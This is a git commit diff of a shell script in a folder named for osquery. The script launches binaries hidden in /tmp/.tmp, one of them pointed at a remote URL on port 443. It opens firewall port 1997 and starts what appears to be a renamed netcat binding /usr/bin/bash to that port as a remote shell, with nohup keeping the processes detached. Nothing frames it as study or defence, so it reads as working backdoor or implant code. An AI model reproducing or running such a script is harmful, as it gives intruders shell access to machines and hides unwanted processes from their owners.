bf31097064a8f0c232bddec977d3db08d9e327da
Trần Bá Quân <t.b.quan.97@gmail.com>
2019-12-23 16:07:52 +0700

    Update Osquery/_Tmp/run.sh

--- OsQuery/_Tmp/run.sh
+++ OsQuery/_Tmp/run.sh
@@ -1,8 +1,8 @@
 #!/usr/bin/bash
 
-pgrep girmx > /dev/null || /tmp/.tmp/girmx
-pgrep linmer > /dev/null || /tmp/.tmp/linmer -url https://192.168.4.135:443
+nohup pgrep girmx > /dev/null || /tmp/.tmp/girmx
+nohup pgrep linmer > /dev/null || /tmp/.tmp/linmer -url https://192.168.4.135:443
 
-sudo firewall-cmd --permanent --zone=public --add-port=1997/tcp
-sudo firewall-cmd --reload
-pgrep girmx > /dev/null || /tmp/.tmp/cn -l -e /usr/bin/bash -p 1997
+firewall-cmd --permanent --zone=public --add-port=1997/tcp
+firewall-cmd --reload
+nohup pgrep cn > /dev/null || /tmp/.tmp/cn -l -e /usr/bin/bash -p 1997
